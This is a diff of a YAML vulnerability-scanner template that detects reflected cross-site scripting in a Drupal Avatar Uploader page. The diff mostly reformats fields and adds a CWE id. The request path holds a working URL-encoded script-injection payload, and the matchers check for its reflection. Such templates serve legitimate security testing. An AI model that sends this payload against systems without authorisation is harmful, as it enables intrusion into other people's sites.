@@ -1,5 +1,4 @@
 id: drupal-avatar-xss
-
 info:
   name: Drupal Avatar Uploader - Cross-Site Scripting
   author: bywalks
@@ -12,29 +11,24 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     max-request: 1
-  tags: xss,drupal,edb,packetstorm,vuln
-
+  tags: drupal,edb,packetstorm,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
+  - matchers:
+      - part: body
+        type: word
         words:
-          - "<div><script>alert(document.domain)</script></div>"
-
-      - type: word
-        part: header
+          - <div><script>alert(document.domain)</script></div>
+      - part: header
+        type: word
         words:
-          - "text/html"
-
-      - type: status
-        status:
+          - text/html
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'
